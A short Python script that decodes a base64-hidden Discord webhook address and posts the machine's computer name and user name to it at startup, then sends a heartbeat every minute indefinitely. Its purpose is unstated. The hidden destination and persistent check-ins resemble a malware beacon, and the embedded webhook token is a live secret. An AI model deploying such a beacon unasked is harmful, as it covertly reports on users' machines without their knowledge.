import base64
import json
import os
import socket
import urllib.request
from time import sleep

# Base64-encoded Discord webhook URL
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4NjYxNC96SDZnWkI4YXNzLTY3TTJVQkVXWFcwTGk2a21vOWtPc2NrOUhOZ0pBMk5Ea2JhYW1vbWs0cDQ4bzR1WGdwaUZFdjJwZA=="

def format_start_data(computer_name,user_name):
    data = {'info':'script_started','script':'system','computer':computer_name,'username':user_name}
    return f"||{json.dumps(data)}||"

def format_alive_data(computer_name,user_name):
    data = {'info':'alive','script':'system','computer':computer_name,'username':user_name}
    return f"||{json.dumps(data)}||"


def send_webhook(message):
    webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")

    payload = json.dumps({
        "content": message
    }).encode("utf-8")

    req = urllib.request.Request(
        webhook_url,
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            response.read()
        return True
    except urllib.error.HTTPError as e:
        print("HTTP error:", e.code, e.read().decode())
        return False
    except Exception as e:
        print("Error:", e)
        return False
        
if __name__ == "__main__":
    computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
    user_name = os.environ.get("USERNAME", "SYSTEM")

    first_message = True
    
    alive_data = format_alive_data(computer_name,user_name)
    while True:
        if first_message:
            msg = (
                f"{format_start_data(computer_name,user_name)}\n"
                "🖥️ **System Startup**\n"
                f"Computer: `{computer_name}`\n"
                f"User Context: `{user_name}`"
            )
        else:        
            msg = (
                f"{alive_data}"
            )
        
        sent = send_webhook(msg)
        if sent and first_message:
            first_message = False

        sleep(60)
